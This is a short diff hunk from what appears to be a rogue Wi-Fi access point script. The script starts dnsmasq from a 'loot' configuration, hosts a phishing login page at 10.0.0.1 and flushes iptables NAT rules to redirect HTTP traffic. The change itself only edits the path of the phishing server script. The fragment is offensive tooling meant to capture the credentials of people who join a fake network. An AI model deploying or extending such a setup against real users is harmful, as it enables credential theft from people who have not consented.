@@ -226,7 +226,7 @@ log-dhcp
     os.system(f"sudo dnsmasq -C loot/dnsmasq.conf &")
 
     print("💻 Hosting phishing login at http://10.0.0.1 ...")
-    os.system("sudo python3 loot/phish_server.py &")
+    os.system("sudo python3 phish_server.py &")
 
     print("🔀 Enabling HTTP redirection with iptables...")
     os.system("sudo iptables -t nat -F")
